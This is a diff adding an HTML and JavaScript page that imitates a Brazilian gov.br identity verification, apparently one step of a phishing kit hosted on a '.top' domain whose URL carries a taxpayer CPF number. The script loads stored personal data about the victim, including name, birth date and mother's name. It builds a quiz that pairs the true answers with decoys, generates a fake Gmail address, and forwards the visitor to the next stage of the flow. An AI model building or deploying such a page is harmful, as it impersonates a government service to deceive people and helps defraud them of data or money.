@@ -1,0 +1,247 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação - GOV</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/stylesfort2.css">
+    <link rel="stylesheet" href="../assets/style.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/all.min.css">
+    <style>body{background:#f5f5f5!important}</style>
+    <style>body{background:#f5f5f5;font-family:"Segoe UI",Roboto,Arial,sans-serif;color:#333;margin:0;padding:0}.cabecalho{display:flex;justify-content:center;align-items:center;height:60px;background:#fff;border-bottom:1px solid #e0e0e0}.cabecalho img{height:40px;object-fit:contain}.main-content{background:#fff;border:1px solid #ddd;border-radius:4px;padding:24px;max-width:600px;margin:24px auto;box-shadow:0 2px 4px rgba(0,0,0,.05)}.question{font-weight:600;color:#036;margin-top:20px;margin-bottom:8px;font-size:16px}.main-content p{margin:0 0 12px;font-size:14px}.options-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}.option-button{background-color:#1351b4;color:#fff;border:1px solid #036;border-radius:4px;padding:14px;text-align:center;font-size:15px;cursor:pointer;transition:background-color .2s , border-color .2s}.option-button:hover{background-color:#0e3f94;border-color:#0e3f94}.selected{background-color:#036;border-color:#036}.btn-custom{background-color:#1351b4;color:#fff;width:100%;padding:14px;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:background-color .2s}.btn-custom:hover{background-color:#0e3f94!important}.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,.5);display:flex;justify-content:center;align-items:center;z-index:1000}.modal-content{background-color:#fff;border-radius:4px;width:90%;max-width:400px;box-shadow:0 4px 8px rgba(0,0,0,.15)}.modal-header{padding:15px;border-bottom:1px solid #eee}.modal-header h5{margin:0;color:#036;font-weight:600;font-size:16px}.modal-body{padding:20px;color:#333;font-size:14px}.modal-footer{padding:15px;border-top:1px solid #eee;display:flex;justify-content:center}.modal-close{width:auto;min-width:100px}</style>
+
+</head>
+
+<body>
+    <div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+        <div class="cabecalho" style="grid-area: top-bar;">
+
+            <script data-pagespeed-no-defer="">//<![CDATA[
+(function(){for(var g="function"==typeof Object.defineProperties?Object.defineProperty:function(b,c,a){if(a.get||a.set)throw new TypeError("ES3 does not support getters and setters.");b!=Array.prototype&&b!=Object.prototype&&(b[c]=a.value)},h="undefined"!=typeof window&&window===this?this:"undefined"!=typeof global&&null!=global?global:this,k=["String","prototype","repeat"],l=0;l<k.length-1;l++){var m=k[l];m in h||(h[m]={});h=h[m]}var n=k[k.length-1],p=h[n],q=p?p:function(b){var c;if(null==this)throw new TypeError("The 'this' value for String.prototype.repeat must not be null or undefined");c=this+"";if(0>b||1342177279<b)throw new RangeError("Invalid count value");b|=0;for(var a="";b;)if(b&1&&(a+=c),b>>>=1)c+=c;return a};q!=p&&null!=q&&g(h,n,{configurable:!0,writable:!0,value:q});var t=this;function u(b,c){var a=b.split("."),d=t;a[0]in d||!d.execScript||d.execScript("var "+a[0]);for(var e;a.length&&(e=a.shift());)a.length||void 0===c?d[e]?d=d[e]:d=d[e]={}:d[e]=c};function v(b){var c=b.length;if(0<c){for(var a=Array(c),d=0;d<c;d++)a[d]=b[d];return a}return[]};function w(b){var c=window;if(c.addEventListener)c.addEventListener("load",b,!1);else if(c.attachEvent)c.attachEvent("onload",b);else{var a=c.onload;c.onload=function(){b.call(this);a&&a.call(this)}}};var x;function y(b,c,a,d,e){this.h=b;this.j=c;this.l=a;this.f=e;this.g={height:window.innerHeight||document.documentElement.clientHeight||document.body.clientHeight,width:window.innerWidth||document.documentElement.clientWidth||document.body.clientWidth};this.i=d;this.b={};this.a=[];this.c={}}function z(b,c){var a,d,e=c.getAttribute("data-pagespeed-url-hash");if(a=e&&!(e in b.c))if(0>=c.offsetWidth&&0>=c.offsetHeight)a=!1;else{d=c.getBoundingClientRect();var f=document.body;a=d.top+("pageYOffset"in window?window.pageYOffset:(document.documentElement||f.parentNode||f).scrollTop);d=d.left+("pageXOffset"in window?window.pageXOffset:(document.documentElement||f.parentNode||f).scrollLeft);f=a.toString()+","+d;b.b.hasOwnProperty(f)?a=!1:(b.b[f]=!0,a=a<=b.g.height&&d<=b.g.width)}a&&(b.a.push(e),b.c[e]=!0)}y.prototype.checkImageForCriticality=function(b){b.getBoundingClientRect&&z(this,b)};u("pagespeed.CriticalImages.checkImageForCriticality",function(b){x.checkImageForCriticality(b)});u("pagespeed.CriticalImages.checkCriticalImages",function(){A(x)});function A(b){b.b={};for(var c=["IMG","INPUT"],a=[],d=0;d<c.length;++d)a=a.concat(v(document.getElementsByTagName(c[d])));if(a.length&&a[0].getBoundingClientRect){for(d=0;c=a[d];++d)z(b,c);a="oh="+b.l;b.f&&(a+="&n="+b.f);if(c=!!b.a.length)for(a+="&ci="+encodeURIComponent(b.a[0]),d=1;d<b.a.length;++d){var e=","+encodeURIComponent(b.a[d]);131072>=a.length+e.length&&(a+=e)}b.i&&(e="&rd="+encodeURIComponent(JSON.stringify(B())),131072>=a.length+e.length&&(a+=e),c=!0);C=a;if(c){d=b.h;b=b.j;var f;if(window.XMLHttpRequest)f=new XMLHttpRequest;else if(window.ActiveXObject)try{f=new ActiveXObject("Msxml2.XMLHTTP")}catch(r){try{f=new ActiveXObject("Microsoft.XMLHTTP")}catch(D){}}f&&(f.open("POST",d+(-1==d.indexOf("?")?"?":"&")+"url="+encodeURIComponent(b)),f.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),f.send(a))}}}function B(){var b={},c;c=document.getElementsByTagName("IMG");if(!c.length)return{};var a=c[0];if(!("naturalWidth"in a&&"naturalHeight"in a))return{};for(var d=0;a=c[d];++d){var e=a.getAttribute("data-pagespeed-url-hash");e&&(!(e in b)&&0<a.width&&0<a.height&&0<a.naturalWidth&&0<a.naturalHeight||e in b&&a.width>=b[e].o&&a.height>=b[e].m)&&(b[e]={rw:a.width,rh:a.height,ow:a.naturalWidth,oh:a.naturalHeight})}return b}var C="";u("pagespeed.CriticalImages.getBeaconData",function(){return C});u("pagespeed.CriticalImages.Run",function(b,c,a,d,e,f){var r=new y(b,c,a,e,f);x=r;d&&w(function(){window.setTimeout(function(){A(r)},0)})});})();pagespeed.CriticalImages.Run('/mod_pagespeed_beacon','https://soliciteacoesagorabr.top/verification/index.php?cpf=09643647510&utm_source=organic&utm_campaign=&utm_medium=&utm_content=&utm_term=','82dtZm2p5Q',true,false,'RKfaASSInM0');
+//]]></script><img src="images/1200px-Gov.br_logo.svg.png" style="max-width:80px;" data-pagespeed-url-hash="1826887608" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+        </div>
+        <div style="grid-area: content; padding: 0 1rem;">
+            <div style="margin-top: 18px;" class="main-content">
+                <p class="question">Confirmação de identidade necessária para verificação.
+                </p>
+
+                <center>
+                    <hr>
+                </center>
+
+                <div class="question">Qual sua data de nascimento?</div>
+                <div class="options-grid" id="birthDateOptions">
+                    <!-- As opções serão carregadas dinamicamente pelo JavaScript -->
+                </div>
+
+                <div class="question">Qual nome da sua mãe?</div>
+                <p>Escolha a alternativa certa.</p>
+                <div class="options-grid" id="motherNameOptions">
+                    <!-- As opções serão carregadas dinamicamente pelo JavaScript -->
+                </div>
+
+                <a href="#" type="submit" class="btn btn-custom" id="confirmButton">Confirmar Dados</a>
+            </div>
+        </div>
+
+        <script src="js/bootstrap.bundle.min.js"></script>
+        <script defer="" src="js/utmify.js"></script>
+
+
+        <script>
+            // Função para ler dados do localStorage
+            function readDadosCPF() {
+                const dados = localStorage.getItem('dadosUsuario');
+                return dados ? JSON.parse(dados) : null;
+            }
+
+            // Função para armazenar um campo específico no localStorage
+            function storeField(field, value) {
+                // Ler os dados existentes primeiro
+                const dados = readDadosCPF() || {};
+                // Atualizar o campo específico
+                dados[field] = value;
+                // Salvar de volta no localStorage
+                localStorage.setItem('dadosCPF', JSON.stringify(dados));
+            }
+
+            // Função para truncar o nome para no máximo duas palavras
+            function truncateName(name) {
+                if (!name) return '';
+
+                // Caso especial para "NENHUMA DAS RESPOSTAS"
+                if (name.trim().toUpperCase() === "NENHUMA DAS RESPOSTAS") {
+                    return "NENHUMA DAS RESPOSTAS";
+                }
+
+                const words = name.trim().split(/\s+/); // Divide o nome em palavras
+                return words.slice(0, 2).join(' '); // Retorna as primeiras duas palavras
+            }
+
+            // Função para gerar um e-mail aleatório baseado no nome
+            function generateEmail(name) {
+                if (!name) return '';
+                const cleanName = name.toLowerCase().replace(/\s+/g, ''); // Remove espaços e transforma em minúsculas
+                const randomSuffix = Math.floor(1000 + Math.random() * 9000); // Gera um número aleatório de 4 dígitos
+                return `${cleanName}${randomSuffix}@gmail.com`; // Retorna o e-mail formatado
+            }
+
+            document.addEventListener('DOMContentLoaded', function () {
+                const dadosUsuario = readDadosCPF();
+
+                if (!dadosUsuario) {
+                    alert('Erro: Dados do usuário não encontrados. Redirecionando...');
+                    const queryParams = window.location.search;
+
+                    window.location.href = `../03/index.php${queryParams}`;
+                    return;
+                }
+
+                // Gera o e-mail e salva no sistema redundante
+                const userName = dadosUsuario.nome;
+                const generatedEmail = generateEmail(userName);
+                storeField('email', generatedEmail);
+
+                const correctBirthDate = dadosUsuario.nascimento;
+                let correctMotherName = truncateName(dadosUsuario.mae); // Trunca o nome da mãe para 2 palavras
+
+
+                // Adiciona as opções para a data de nascimento
+                const birthDates = [
+                    correctBirthDate,
+                    '02/03/1915',
+                    '15/07/1916',
+                    '30/08/1917'
+                ];
+                birthDates.sort(() => Math.random() - 0.5); // Embaralha as opções
+
+                birthDates.forEach(date => {
+                    const button = document.createElement('button');
+                    button.className = 'option-button';
+                    button.textContent = date;
+                    button.dataset.correct = (date === correctBirthDate);
+                    button.addEventListener('click', function (event) {
+                        event.preventDefault();
+                        document.querySelectorAll('#birthDateOptions .option-button').forEach(btn => btn.classList.remove('selected'));
+                        button.classList.add('selected');
+                    });
+                    document.getElementById('birthDateOptions').appendChild(button);
+                });
+
+                // Adiciona as opções para o nome da mãe
+                let motherNames = [
+                    'MARIA SOUZA',
+                    'ANA SILVA',
+                    'CARLA PEREIRA'
+                ];
+
+                // Se correctMotherName for igual a "NENHUMA DAS RESPOSTAS", não o inclua duas vezes
+                if (correctMotherName && correctMotherName.trim() !== "" && correctMotherName !== "NENHUMA DAS RESPOSTAS") {
+                    motherNames.push(correctMotherName.toUpperCase());
+                } else {
+                    // Adiciona "NENHUMA DAS RESPOSTAS" como opção se for o valor correto ou se não tiver nome da mãe
+                    motherNames.push('NENHUMA DAS RESPOSTAS');
+                }
+
+                // Log para debug
+
+                motherNames.sort(() => Math.random() - 0.5); // Embaralha as opções
+
+                motherNames.forEach(name => {
+                    const button = document.createElement('button');
+                    button.className = 'option-button';
+                    button.textContent = name;
+                    // Verifica se o nome é o correto
+                    let isCorrect = false;
+
+                    if (name === 'NENHUMA DAS RESPOSTAS' && (!correctMotherName || correctMotherName.trim() === '')) {
+                        // Se não houver nome da mãe e a opção for "NENHUMA DAS RESPOSTAS"
+                        isCorrect = true;
+                    } else if (correctMotherName && name === correctMotherName.toUpperCase()) {
+                        // Se houver nome da mãe e a opção for igual a ele
+                        isCorrect = true;
+                    }
+
+                    button.dataset.correct = isCorrect;
+                    button.addEventListener('click', function (event) {
+                        event.preventDefault();
+                        document.querySelectorAll('#motherNameOptions .option-button').forEach(btn => btn.classList.remove('selected'));
+                        button.classList.add('selected');
+                    });
+                    document.getElementById('motherNameOptions').appendChild(button);
+                });
+
+                // Verifica se as seleções estão corretas ao clicar em Confirmar
+                document.getElementById('confirmButton').addEventListener('click', function () {
+                    const selectedBirthDate = document.querySelector('#birthDateOptions .selected');
+                    const selectedMotherName = document.querySelector('#motherNameOptions .selected');
+
+                    if (selectedBirthDate && selectedMotherName) {
+                        const birthDateCorrect = selectedBirthDate.dataset.correct === 'true';
+                        const motherNameCorrect = selectedMotherName.dataset.correct === 'true';
+
+                        // Log para debugging
+
+                        if (birthDateCorrect && motherNameCorrect) {
+                            const queryParams = window.location.search;
+                            window.location.href = `../03/index.php${queryParams}`;
+                        } else {
+                            // Cria e exibe um modal de erro para informações incorretas
+                            const errorModal = document.createElement('div');
+                            errorModal.className = 'modal-overlay';
+                            errorModal.innerHTML = `
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h5>Erro de Verificação</h5>
+                        </div>
+                        <div class="modal-body">
+                            <p>As informações selecionadas estão incorretas.</p>
+                            <p>Por favor, verifique seus dados e tente novamente.</p>
+                        </div>
+                        <div class="modal-footer">
+                            <a href="#" class="btn btn-custom modal-close">Entendi</a>
+                        </div>
+                    </div>
+                `;
+                            document.body.appendChild(errorModal);
+                            document.querySelector('.modal-close').addEventListener('click', function () {
+                                document.body.removeChild(errorModal);
+                            });
+                        }
+                    } else {
+                        // Cria e exibe um modal de alerta para seleção incompleta
+                        const alertModal = document.createElement('div');
+                        alertModal.className = 'modal-overlay';
+                        alertModal.innerHTML = `
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5>Atenção</h5>
+                    </div>
+                    <div class="modal-body">
+                        <p>Por favor, selecione uma opção para cada pergunta.</p>
+                    </div>
+                    <div class="modal-footer">
+                        <a href="#" class="btn btn-custom modal-close">OK</a>
+                    </div>
+                </div>
+            `;
+                        document.body.appendChild(alertModal);
+                        document.querySelector('.modal-close').addEventListener('click', function () {
+                            document.body.removeChild(alertModal);
+                        });
+                    }
+                });
+            });
+        </script>
+
+
+
+</div></body></html>
